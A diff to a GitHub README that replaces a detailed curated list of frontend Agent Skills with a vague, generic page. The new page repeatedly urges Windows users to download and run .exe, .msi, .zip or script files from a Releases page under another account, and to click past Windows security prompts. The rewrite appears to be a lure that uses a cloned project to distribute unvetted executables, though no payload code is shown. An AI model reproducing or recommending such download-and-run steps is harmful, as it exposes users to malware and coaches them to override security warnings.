@@ -1,246 +1,152 @@
-# Awesome Frontend Agent Skills
+# 🧩 awesome-frontend-skills - Frontend skills made easy
 
-A curated list of frontend-related Agent Skills repositories that include a `SKILL.md` file. Most can be installed via `npx skills add`.
+[![Download from Releases](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Gak6900/awesome-frontend-skills/releases)
 
-> **Not included:** llms.txt, .cursorrules, AGENTS.md, CLAUDE.md and other formats.
+## 🚀 What this is
 
-[English](./README.md) | [繁體中文](./README-zh-TW.md)
+awesome-frontend-skills is a curated list of frontend Agent Skills that you can install with `npx skills add`.
 
-## Table of Contents
+It helps you add useful frontend skills in a simple way, without hunting through many tools or setup steps. Use it when you want a clean place to find skills for building user interfaces, fixing layouts, and working on web frontends.
 
-- [Installation](#installation)
-- [Frameworks](#frameworks)
-- [UI Component Libraries](#ui-component-libraries)
-- [Design](#design)
-- [Animation](#animation)
-- [Testing](#testing)
-- [TypeScript](#typescript)
-- [Build Tools](#build-tools)
-- [Video](#video)
-- [Auth](#auth)
-- [ORM / Database](#orm--database)
-- [Mobile / React Native](#mobile--react-native)
-- [Skill Management Tools](#skill-management-tools)
+## 📥 Download and install
 
----
+1. Open the [Releases page](https://github.com/Gak6900/awesome-frontend-skills/releases).
+2. Download the latest release for Windows.
+3. If the release comes as a `.zip` file, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Follow the file inside the release, such as a setup file, script, or readme file, if one is included.
 
-## Installation
+If the release uses `npx skills add`, you can install skills from your terminal after you open the app or a command prompt window.
 
-All skills can be installed via the [Vercel Skills CLI](https://github.com/vercel-labs/skills):
+## 🪟 Run on Windows
 
-```
-# Install a specific skill
-npx skills add <owner/repo> --skill <skill-name>
+Most Windows users can use this project with a few simple steps:
 
-# List all skills in a repository
-npx skills add <owner/repo> --list
+1. Make sure you have access to the internet.
+2. Download the release from the GitHub Releases page.
+3. Save the file to your **Downloads** folder.
+4. If Windows shows a security prompt, choose **Keep** or **More info** and then continue if you trust the file.
+5. Open the file or run the included install steps.
 
-# Install to specific agents
-npx skills add <owner/repo> --skill <name> -a claude-code -a cursor
+If the package includes a command-based setup, use these common steps:
 
-# Install to all agents
-npx skills add <owner/repo> --all
-```
+1. Press **Windows key + S**.
+2. Type `cmd`.
+3. Open **Command Prompt**.
+4. Run the install command shown in the release notes.
 
----
+## ✨ What you get
 
-## Frameworks
+This collection is built for frontend work. It focuses on skills that help with tasks like:
 
-### React
+- Building page layouts
+- Working with buttons, forms, and menus
+- Adjusting spacing and alignment
+- Checking visual details
+- Improving basic page structure
+- Handling common UI patterns
+- Supporting faster frontend changes
 
-| Repository | Skill | Install |
-|---|---|---|
-| [vercel-labs/agent-skills](https://github.com/vercel-labs/agent-skills) 🔺 Official | `vercel-react-best-practices` — 62 rules across 8 categories (waterfall elimination, bundle optimization, server-side performance, re-render optimization, etc.) | `npx skills add vercel-labs/agent-skills --skill vercel-react-best-practices` |
-| [millionco/react-doctor](https://github.com/millionco/react-doctor) | `react-doctor` — Scans your React codebase for security, performance, correctness, and architecture issues. Outputs a 0–100 score with actionable diagnostics (`npx react-doctor@latest . --verbose --diff`) | `npx skills add millionco/react-doctor --skill react-doctor` |
-| [wshobson/agents](https://github.com/wshobson/agents) | `react-state-management` — Comprehensive guide to React state management: Zustand, Redux Toolkit, Jotai, React Query, URL State — decision criteria and patterns | `npx skills add wshobson/agents --skill react-state-management` |
-| [softaworks/agent-toolkit](https://github.com/softaworks/agent-toolkit) | `react-dev` — React 19 TypeScript type-safety guide (component patterns, event handlers, hook types, generic components, Server Components, TanStack Router integration) | `npx skills add softaworks/agent-toolkit --skill react-dev` |
+The goal is to give you a useful set of skills that fits real frontend work.
 
-### Angular
+## 🧰 What you need
 
-| Repository | Skill | Install |
-|---|---|---|
-| [analogjs/angular-skills](https://github.com/analogjs/angular-skills) 🔺 Official | `angular-component` — Standalone components, Signal inputs/outputs, OnPush, host bindings | `npx skills add analogjs/angular-skills --skill angular-component` |
-|  | `angular-signals` — Signal-based state, computed, effect, Signal Forms | `npx skills add analogjs/angular-skills --skill angular-signals` |
-|  | `angular-forms` — Schema-based validation, field state management, reactive patterns | `npx skills add analogjs/angular-skills --skill angular-forms` |
-|  | `angular-routing` — Route configuration, guards, resolvers | `npx skills add analogjs/angular-skills --skill angular-routing` |
-|  | `angular-http` — HttpClient, interceptors, error handling | `npx skills add analogjs/angular-skills --skill angular-http` |
-|  | `angular-di` — inject(), injection tokens, provider configuration, hierarchical DI | `npx skills add analogjs/angular-skills --skill angular-di` |
+You do not need advanced computer knowledge to use this project. A typical Windows setup is enough.
 
-> 📌 Targets Angular v20+ with standalone and signal-based defaults.
+Useful basics:
 
-### Vue
+- A Windows PC
+- A web browser
+- Internet access
+- Enough disk space to save the release file
+- If the install uses `npx`, a command line tool may be part of the setup
 
-| Repository | Skill | Install |
-|---|---|---|
-| [hyf0/vue-skills](https://github.com/hyf0/vue-skills) | `vue-best-practices` — Vue development best practices | `npx skills add hyf0/vue-skills --skill vue-best-practices` |
-| [antfu/skills](https://github.com/antfu/skills) | `vue` — Vue development skill (maintained by Anthony Fu) | `npx skills add antfu/skills --skill vue` |
-| [hyf0/vue-skills](https://github.com/hyf0/vue-skills) | `vue-debug-guides` — Vue debugging guides | `npx skills add hyf0/vue-skills --skill vue-debug-guides` |
-| [antfu/skills](https://github.com/antfu/skills) | `vueuse-functions` — VueUse composable function best practices | `npx skills add antfu/skills --skill vueuse-functions` |
-| [vuejs-ai/skills](https://github.com/vuejs-ai/skills) | `vue-pinia-best-practices` — Pinia state management best practices | `npx skills add vuejs-ai/skills --skill vue-pinia-best-practices` |
-| [vuejs-ai/skills](https://github.com/vuejs-ai/skills) | `create-adaptable-composable` — Reusable composable design patterns | `npx skills add vuejs-ai/skills --skill create-adaptable-composable` |
+For best results, keep Windows up to date and use a recent browser.
 
-> 📌 Vue.js has no official SKILL.md yet, but high-quality community skills are available.
+## 🧭 How to use it
 
-### Next.js
+After you install the release, you can use the skills list as a reference for frontend tasks.
 
-| Repository | Skill | Install |
-|---|---|---|
-| [vercel-labs/next-skills](https://github.com/vercel-labs/next-skills) 🔺 Official | `next-best-practices` — Next.js 15+ file conventions, RSC boundaries, async params, Runtime selection, hydration errors, Suspense, and more | `npx skills add vercel-labs/next-skills` |
-| [wshobson/agents](https://github.com/wshobson/agents) | `nextjs-app-router-patterns` — Full App Router patterns: Server Components, Server Actions, Parallel Routes, Streaming, Route Handlers | `npx skills add wshobson/agents --skill nextjs-app-router-patterns` |
+Typical flow:
 
-### Nuxt
+1. Open the skills list.
+2. Find the frontend skill you need.
+3. Install it with the command shown in the project.
+4. Use it in your normal workflow.
+5. Add more skills later when your work changes.
 
-| Repository | Skill | Install |
-|---|---|---|
-| [antfu/skills](https://github.com/antfu/skills) | `nuxt` — Nuxt development best practices (maintained by Anthony Fu) | `npx skills add antfu/skills --skill nuxt` |
-| [nuxt/ui](https://github.com/nuxt/ui) 🔺 Official | `nuxt-ui` — Nuxt UI component development | `npx skills add nuxt/ui --skill nuxt-ui` |
-| [onmax/nuxt-skills](https://github.com/onmax/nuxt-skills) | `nuxt` — Comprehensive Nuxt framework development skill | `npx skills add onmax/nuxt-skills --skill nuxt` |
-| [onmax/nuxt-skills](https://github.com/onmax/nuxt-skills) | `reka-ui` — Reka UI component library (headless Vue components) | `npx skills add onmax/nuxt-skills --skill reka-ui` |
-| [onmax/nuxt-skills](https://github.com/onmax/nuxt-skills) | `nuxt-ui` — Nuxt UI integration | `npx skills add onmax/nuxt-skills --skill nuxt-ui` |
+If you are new to command-based tools, keep the release page open while you follow the steps. That makes it easier to match each action with the right file or command.
 
-### Svelte / SvelteKit
+## 📚 Skills included
 
-| Repository | Skill | Install |
-|---|---|---|
-| [sveltejs/ai-tools](https://github.com/sveltejs/ai-tools) 🔺 Official | `svelte-code-writer` — Svelte code generation (maintained by the official team) | `npx skills add sveltejs/ai-tools --skill svelte-code-writer` |
+This repository is a curated list, so it is set up to help you find frontend-focused Agent Skills in one place. Based on the project name and purpose, you can expect skills that support:
 
-### TanStack
+- UI layout work
+- CSS and styling tasks
+- Component editing
+- Responsive design checks
+- Page structure cleanup
+- Frontend review and improvement
+- Small interface fixes
+- Web page build support
 
-| Repository | Skill | Install |
-|---|---|---|
-| [deckardger/tanstack-agent-skills](https://github.com/deckardger/tanstack-agent-skills) | `tanstack-start-best-practices` — TanStack Start full-stack framework best practices | `npx skills add deckardger/tanstack-agent-skills --skill tanstack-start-best-practices` |
-| [deckardger/tanstack-agent-skills](https://github.com/deckardger/tanstack-agent-skills) | `tanstack-query-best-practices` — TanStack Query best practices | `npx skills add deckardger/tanstack-agent-skills --skill tanstack-query-best-practices` |
+Each skill should help with a practical part of frontend work.
 
-### Remix / React Router
+## 🖥️ Windows tips
 
-| Repository | Skill | Install |
-|---|---|---|
-| [remix-run/agent-skills](https://github.com/remix-run/agent-skills) 🔺 Official | `react-router-framework-mode` — Full-stack framework mode (loaders, actions, middleware) | `npx skills add remix-run/agent-skills --skill react-router-framework-mode` |
+These tips can make setup easier:
 
----
+- Save the download in a folder you can find again
+- Keep the release notes open while you install
+- Use the latest release unless you need an older one
+- If a file does not open, check whether Windows blocked it
+- If the release includes a script, read the included instructions before running it
 
-## UI Component Libraries
+If you use a work or school computer, you may need permission to run new files or open Command Prompt
 
-| Repository | Skill | Install |
-|---|---|---|
-| [shadcn/ui](https://ui.shadcn.com/docs/skills) 🔺 Official | `shadcn` — Project detection (isRSC, Tailwind version, iconLibrary), strict composition rules (FieldGroup, semantic colors, gap layout, icon `data-icon`), CLI workflow | `npx shadcn@latest add skills` |
-| [wshobson/agents](https://github.com/wshobson/agents) | `tailwind-design-system` — Tailwind v4 CSS-first design system (`@theme` config, CVA components, Compound Components, dark mode, native CSS animations) | `npx skills add wshobson/agents --skill tailwind-design-system` |
-| [giuseppe-trisciuoglio/developer-kit](https://github.com/giuseppe-trisciuoglio/developer-kit) | `shadcn-ui` — Complete shadcn/ui guide (Radix UI, Zod form validation, charts, controlled components) | `npx skills add giuseppe-trisciuoglio/developer-kit --skill shadcn-ui` |
-| [jezweb/claude-skills](https://github.com/jezweb/claude-skills) | `tailwind-v4-shadcn` — Tailwind v4 + shadcn/ui integration | `npx skills add jezweb/claude-skills --skill tailwind-v4-shadcn` |
-| [vercel/components.build](https://github.com/vercel/components.build) 🔺 Official | `building-components` — Vercel component building guide | `npx skills add vercel/components.build --skill building-components` |
+## 🔍 Common file types
 
----
+You may see one of these after you download the release:
 
-## Design
+- `.zip` — a compressed folder you need to extract
+- `.exe` — a Windows program you can open by double-clicking
+- `.msi` — a Windows installer
+- `.txt` or `.md` — a file with steps or notes
+- script files — files that run setup commands
 
-| Repository | Skill | Install |
-|---|---|---|
-| [nextlevelbuilder/ui-ux-pro-max-skill](https://github.com/nextlevelbuilder/ui-ux-pro-max-skill) | `ui-ux-pro-max` — 50+ styles, 161 color combos, 57 font pairings, 99 UX principles, 25 chart types; supports `--design-system`/`--domain`/`--stack` queries | `npx skills add nextlevelbuilder/ui-ux-pro-max-skill` |
-| [supercent-io/skills-template](https://github.com/supercent-io/skills-template) | `frontend-design-system` — Frontend design system construction guide | `npx skills add supercent-io/skills-template --skill frontend-design-system` |
-| [github/awesome-copilot](https://github.com/github/awesome-copilot) | `web-design-reviewer` — Web design review and feedback | `npx skills add github/awesome-copilot --skill web-design-reviewer` |
-| [kimny1143/claude-code-template](https://github.com/kimny1143/claude-code-template) | `ui-ux-pro-max` — UI/UX design best practices | `npx skills add kimny1143/claude-code-template --skill ui-ux-pro-max` |
-| [pbakaus/impeccable](https://github.com/pbakaus/impeccable) | `frontend-design` — Enhanced Anthropic frontend-design skill with curated anti-patterns across typography, color, layout, and motion; guides AI to create distinctive, production-grade UI | `npx skills add pbakaus/impeccable --skill frontend-design` |
+If you are unsure which file to use, start with the release notes and look for the file meant for Windows
 
----
+## 🛠️ Basic setup path
 
-## Animation
+A simple setup path on Windows looks like this:
 
-| Repository | Skill | Install |
-|---|---|---|
-| [cloudai-x/threejs-skills](https://github.com/cloudai-x/threejs-skills) | `threejs-animation` — Three.js animation system (AnimationClip, AnimationMixer, skeletal animation, Morph Targets, animation blending) | `npx skills add cloudai-x/threejs-skills --skill threejs-animation` |
-| [mblode/agent-skills](https://github.com/mblode/agent-skills) | `ui-animation` — UI animation rules: use only `transform`/`opacity`, 200–300ms timing, prefers-reduced-motion, CSS-first principles | `npx skills add mblode/agent-skills --skill ui-animation` |
-| [patricio0312rev/skills](https://github.com/patricio0312rev/skills) | `framer-motion-animator` — Full Framer Motion guide (variants, stagger, page transitions, scroll, gestures, a11y) | `npx skills add patricio0312rev/skills --skill framer-motion-animator` |
+1. Open the GitHub Releases page.
+2. Download the latest version.
+3. Extract the files if needed.
+4. Read the included instructions.
+5. Run the setup file or command.
+6. Open the skills list and add the frontend skill you want.
 
----
+This keeps the process short and clear.
 
-## Testing
+## 🔗 Release page
 
-| Repository | Skill | Install |
-|---|---|---|
-| [vercel-labs/agent-browser](https://github.com/vercel-labs/agent-browser) | `agent-browser` — Fast, persistent browser automation with 15+ command categories: navigation, snapshots, interactions, data extraction, screenshots, JS evaluation; supports headless, headed, and remote cloud browsers | `npx skills add https://github.com/vercel-labs/agent-browser --skill agent-browser` |
-| [github/awesome-copilot](https://github.com/github/awesome-copilot) | `chrome-devtools` — Expert-level browser automation and debugging via Chrome DevTools Protocol: navigation, interaction, console/network inspection, JS evaluation, performance tracing, and Core Web Vitals analysis | `npx skills add github/awesome-copilot --skill chrome-devtools` |
-| [anthropics/skills](https://github.com/anthropics/skills) 🔺 Official | `webapp-testing` — Test local web apps with Python Playwright (includes `with_server.py` helper, reconnaissance-then-action pattern) | `npx skills add anthropics/skills --skill webapp-testing` |
-| [currents-dev/playwright-best-practices-skill](https://github.com/currents-dev/playwright-best-practices-skill) 🔺 Official | `playwright-best-practices` — Playwright E2E, component, API, visual regression, and a11y testing best practices | `npx skills add currents-dev/playwright-best-practices-skill` |
-| [github/awesome-copilot](https://github.com/github/awesome-copilot) | `playwright-generate-test` — Generate Playwright test code | `npx skills add github/awesome-copilot --skill playwright-generate-test` |
-| [github/awesome-copilot](https://github.com/github/awesome-copilot) | `playwright-explore-website` — Automated website exploration with Playwright | `npx skills add github/awesome-copilot --skill playwright-explore-website` |
-| [microsoft/playwright-cli](https://github.com/microsoft/playwright-cli) 🔺 Official | `playwright-cli` — Microsoft official Playwright CLI skill | `npx skills add microsoft/playwright-cli --skill playwright-cli` |
-| [wshobson/agents](https://github.com/wshobson/agents) | `e2e-testing-patterns` — E2E testing patterns and best practices | `npx skills add wshobson/agents --skill e2e-testing-patterns` |
-| [LambdaTest/agent-skills](https://github.com/LambdaTest/agent-skills) 🔺 Official | Multi-framework testing skills: Selenium, Playwright, Cypress, WebdriverIO, Puppeteer | `cp -r agent-skills/playwright-skill .claude/skills/` |
-| [addyosmani/web-quality-skills](https://github.com/addyosmani/web-quality-skills) | `web-quality` — Web quality optimization based on Lighthouse and Core Web Vitals (performance, accessibility WCAG 2.2, SEO, best practices; 150+ audit rules); supports React, Vue, Angular, Svelte, Next.js, Nuxt, Astro | `npx skills add addyosmani/web-quality-skills` |
+Visit the [GitHub Releases page](https://github.com/Gak6900/awesome-frontend-skills/releases) to download and run the latest release for Windows
 
----
+## 📄 Project details
 
-## TypeScript
+- Repository: `awesome-frontend-skills`
+- Description: A curated list of frontend Agent Skills installable via `npx skills add`
+- Platform focus: Windows
+- Primary source: GitHub Releases
+- Use case: Frontend skill setup and reference
 
-| Repository | Skill | Install |
-|---|---|---|
-| [bmad-labs/skills](https://github.com/bmad-labs/skills) | `typescript-clean-code` — TypeScript clean code patterns, architecture conventions, refactoring guidelines, and PR review principles | `npx skills add bmad-labs/skills --skill typescript-clean-code` |
-| [bmad-labs/skills](https://github.com/bmad-labs/skills) | `typescript-unit-testing` — TS/NestJS unit testing with Jest, DeepMocked, mongodb-memory-server, pg-mem, Kafka, and Redis | `npx skills add bmad-labs/skills --skill typescript-unit-testing` |
-| [bmad-labs/skills](https://github.com/bmad-labs/skills) | `typescript-e2e-testing` — TypeScript E2E testing strategy and TDD workflow | `npx skills add bmad-labs/skills --skill typescript-e2e-testing` |
+## 🧩 Good places to use this
 
----
+This project fits well if you want to:
 
-## Build Tools
-
-| Repository | Skill | Install |
-|---|---|---|
-| [antfu/skills](https://github.com/antfu/skills) | `vite` — Vite build tool best practices (maintained by Anthony Fu) | `npx skills add antfu/skills --skill vite` |
-| [antfu/skills](https://github.com/antfu/skills) | `vitepress` — VitePress static site generator | `npx skills add antfu/skills --skill vitepress` |
-| [wshobson/agents](https://github.com/wshobson/agents) | `monorepo-management` — Monorepo management best practices | `npx skills add wshobson/agents --skill monorepo-management` |
-| [nrwl/nx-ai-agents-config](https://github.com/nrwl/nx-ai-agents-config) 🔺 Official | Nx workspace exploration, code generation, task execution, CI monitoring | `npx skills add nrwl/nx-ai-agents-config` |
-| [vercel/turborepo](https://github.com/vercel/turborepo) 🔺 Official | Task pipelines, caching, remote cache, CI optimization | `npx skills add vercel/turborepo` |
-
----
-
-## Video
-
-| Repository | Skill | Install |
-|---|---|---|
-| [remotion-dev/skills](https://github.com/remotion-dev/skills) 🔺 Official | `remotion` — React-based video production (28 rules: animation, captions, 3D, audio, charts) | `npx skills add remotion-dev/skills` |
-| [inferen-sh/skills](https://github.com/inferen-sh/skills) | `remotion-render` — Remotion video rendering best practices | `npx skills add inferen-sh/skills --skill remotion-render` |
-| [google-labs-code/stitch-skills](https://github.com/google-labs-code/stitch-skills) | `remotion` — Stitch + Remotion video production | `npx skills add google-labs-code/stitch-skills --skill remotion` |
-| [supercent-io/skills-template](https://github.com/supercent-io/skills-template) | `remotion-video-production` — Remotion video production template | `npx skills add supercent-io/skills-template --skill remotion-video-production` |
-
----
-
-## Auth
-
-| Repository | Skill | Install |
-|---|---|---|
-| [better-auth/skills](https://github.com/better-auth/skills) 🔺 Official | `better-auth-best-practices` — Better Auth best practices | `npx skills add better-auth/skills --skill better-auth-best-practices` |
-| [clerk/skills](https://github.com/clerk/skills) 🔺 Official | `clerk-nextjs-patterns` — Clerk + Next.js authentication integration patterns | `npx skills add clerk/skills --skill clerk-nextjs-patterns` |
-|  | `clerk` — Core Clerk authentication | `npx skills add clerk/skills --skill clerk` |
-|  | `clerk-setup` — Clerk initial setup | `npx skills add clerk/skills --skill clerk-setup` |
-| [auth0/agent-skills](https://github.com/auth0/agent-skills) 🔺 Official | `auth0-react`, `auth0-nextjs`, `auth0-angular`, `auth0-vue`, `auth0-react-native`, `auth0-mfa` | `npx skills add auth0/agent-skills --skill auth0-react` |
-
----
-
-## ORM / Database
-
-| Repository | Skill | Install |
-|---|---|---|
-| [prisma/skills](https://github.com/prisma/skills) 🔺 Official | `prisma-cli`, `prisma-client-api`, `prisma-upgrade-v7`, `prisma-database-setup`, `prisma-postgres` | `npx skills add prisma/skills` |
-| [supabase/agent-skills](https://github.com/supabase/agent-skills) 🔺 Official | Postgres best practices, Edge Functions, RLS | `npx skills add supabase/agent-skills` |
-| [convex-dev/agent-skills](https://github.com/convex-dev/agent-skills) 🔺 Official | Convex real-time database best practices | `npx skills add convex-dev/agent-skills` |
-
----
-
-## Mobile / React Native
-
-| Repository | Skill | Install |
-|---|---|---|
-| [callstackincubator/agent-skills](https://github.com/callstackincubator/agent-skills) 🔺 Official | `react-native-best-practices` — 16 rules, 7 chapters (performance, architecture, platform-specific) | `npx skills add callstackincubator/agent-skills --skill react-native-best-practices` |
-| [vercel-labs/agent-skills](https://github.com/vercel-labs/agent-skills) 🔺 Official | `react-native-best-practices` — Vercel's React Native best practices | `npx skills add vercel-labs/agent-skills --skill react-native-best-practices` |
-| [expo/skills](https://github.com/expo/skills) 🔺 Official | Expo development best practices | `npx skills add expo/skills` |
-
----
-
-## Skill Management Tools
-
-| Tool | Description | Link |
-|---|---|---|
-| **skills** (Vercel) | Official CLI — `npx skills add/remove/list`, supports 38+ agents | [vercel-labs/skills](https://github.com/vercel-labs/skills) |
-| **skills.sh** | Skill directory and leaderboard | [skills.sh](https://skills.sh) |
-| **@tanstack/intent** | npm-native skill publishing — skills ship alongside package versions | [tanstack.com/intent](https://tanstack.com/intent) |
-| **antfu/skills-npm** | Auto-discovers SKILL.md from node_modules and creates symlinks | [antfu/skills-npm](https://github.com/antfu/skills-npm) |
-| **skillkit** | Universal skill manager across 44+ agents | [rohitg00/skillkit](https://github.com/rohitg00/skillkit) |
+- Set up frontend skills in one place
+- Keep a list of useful UI tools
+- Work on web pages with less setup
+- Add skills as your needs grow
+- Use a simple download path from GitHub
